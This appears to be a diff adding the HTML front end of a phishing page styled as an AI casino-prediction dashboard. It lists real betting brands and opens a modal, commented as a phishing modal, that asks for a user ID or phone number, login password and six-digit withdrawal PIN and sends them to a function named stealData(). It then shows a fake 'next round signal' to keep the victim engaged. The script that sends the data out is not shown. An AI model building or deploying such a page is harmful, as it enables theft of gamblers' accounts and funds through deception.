@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Prime AI</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div style="padding: 20px; text-align: center;">
+        <h2 style="font-family: 'Rajdhani'; color: var(--primary);">SELECT SERVER</h2>
+        <p style="color: #888;">Choose your casino to connect the API</p>
+    </div>
+
+    <div class="grid-container">
+        <!-- GAME 1: P999 -->
+        <!-- Image src me real logo link daal, ya download karke images folder me rakh -->
+        <div class="game-card" onclick="openPhish('P999', 'images/p999.png')">
+            <img src="https://placehold.co/100x100/111/ffcc00?text=P999" class="game-logo">
+            <h3>P999.COM</h3>
+            <p style="color:green; font-size:0.8rem;">● Online</p>
+        </div>
+
+        <!-- GAME 2: K1 GAME -->
+        <div class="game-card" onclick="openPhish('K1 GAME', 'images/k1.png')">
+            <img src="https://placehold.co/100x100/111/e91e63?text=K1" class="game-logo">
+            <h3>K1 GAME</h3>
+            <p style="color:green; font-size:0.8rem;">● Online</p>
+        </div>
+
+        <!-- GAME 3: 1xBET -->
+        <div class="game-card" onclick="openPhish('1xBET', 'images/1xbet.png')">
+            <img src="https://placehold.co/100x100/111/2196f3?text=1X" class="game-logo">
+            <h3>1xBET</h3>
+            <p style="color:green; font-size:0.8rem;">● Online</p>
+        </div>
+
+        <!-- GAME 4: 55CLUB -->
+        <div class="game-card" onclick="openPhish('55CLUB', 'images/55.png')">
+            <img src="https://placehold.co/100x100/111/ff5722?text=55" class="game-logo">
+            <h3>55 CLUB</h3>
+            <p style="color:green; font-size:0.8rem;">● Online</p>
+        </div>
+    </div>
+
+    <!-- PHISHING MODAL -->
+    <div id="phishModal" class="modal">
+        <div class="modal-content">
+            <h2 id="phishTitle" style="font-family: 'Rajdhani'; margin-bottom: 10px;">LOGIN REQUIRED</h2>
+            <p style="font-size: 0.8rem; color: #aaa; margin-bottom: 20px;">Establish secure connection with game server</p>
+
+            <div id="inputArea">
+                <input type="text" id="uid" placeholder="User ID / Phone Number">
+                <input type="password" id="pass" placeholder="Login Password">
+                <input type="number" id="pin" placeholder="6-Digit Withdrawal PIN" style="border-color: var(--secondary);">
+                <button class="cta-btn" style="width:100%; margin-top:15px;" onclick="stealData()">CONNECT</button>
+            </div>
+
+            <!-- LOADING / TERMINAL -->
+            <div id="loaderArea" style="display:none;">
+                <div class="terminal" id="logs"></div>
+            </div>
+
+            <!-- RESULT AREA -->
+            <div id="resultArea" style="display:none;">
+                <p>NEXT ROUND SIGNAL:</p>
+                <div class="prediction-box" id="prediction">0.00x</div>
+                <button class="cta-btn" onclick="nextSignal()">NEXT SIGNAL</button>
+            </div>
+
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
